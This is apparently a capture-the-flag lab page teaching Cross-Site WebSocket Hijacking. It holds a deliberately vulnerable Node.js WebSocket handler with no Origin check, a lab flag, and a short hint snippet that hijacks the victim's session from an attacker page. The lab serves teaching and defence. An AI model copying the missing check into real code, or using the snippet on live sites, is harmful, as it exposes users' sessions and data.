Cross-Site WebSocket Hijacking

The WebSocket server authenticates connections using the session cookie — but never validates the Origin header. Because browsers automatically include cookies in WebSocket handshakes and SOP does not restrict cross-origin WebSocket connections, any attacker page can connect as the victim and read the flag.

🔒 Why SOP Does Not Protect WebSockets
Regular HTTP fetch (cross-origin) Browser sends request Server responds with data SOP blocks JS from reading the response ← protected WebSocket upgrade (cross-origin) Browser sends: GET /ws/x5 HTTP/1.1 Origin: http://localhost:3001 ← always included Cookie: session=abc123 ← cookies auto-sent Server sends: 101 Switching Protocols WebSocket connection established — SOP does NOT block this ws.onmessage = e => console.log(e.data) ← attacker reads everything

The WebSocket protocol allows cross-origin connections by design. The only protection is an explicit server-side check of the Origin header during the HTTP upgrade handshake.

Unlike CORS, there is no browser mechanism to enforce a same-origin policy on WebSocket connections. The server must implement it manually.

📜 Vulnerable Server Code 
// server.js — WebSocket handler without Origin check
const wss = new WebSocket.Server({ server });

wss.on('connection', (ws, req) => {
  // BUG: no Origin header check
  // SAFE version:
  // const origin = req.headers.origin;
  // if (origin !== 'http://localhost:3000') { ws.close(4001, 'Forbidden'); return; }

  // Authenticate via session cookie (cookies are sent automatically)
  const session = parseSessionCookie(req.headers.cookie);
  const user    = session?.user || { username: 'victim' };

  // Send flag to every connection regardless of origin
  ws.send(JSON.stringify({
    type:     'welcome',
    username: user.username,
    flag:     'HUNT{websockets_ignore_sop_too}',
    ts:       new Date().toISOString(),
  }));

  ws.on('message', (data) => {
    // echo pings
    ws.send(JSON.stringify({ type: 'pong', echo: data.toString() }));
  });
});

💡 Hints
#1 Cookies & WebSockets
WebSocket handshakes send cookies automatically — just like a normal HTTP request. The Same-Origin Policy does not prevent cross-origin WebSocket connections.
#2 No Origin validation
Check the server's WebSocket handler. Does it validate the Origin header on connection? If not, any page can connect as the victim.
#3 The exploit one-liner
From attacker/public/x5.html, run:

const ws = new WebSocket('ws://localhost:3000/ws/x5');
ws.onmessage = e => {
  const data = JSON.parse(e.data);
  document.getElementById('out').textContent = data.flag;
};
The browser auto-sends the victim's session cookie.
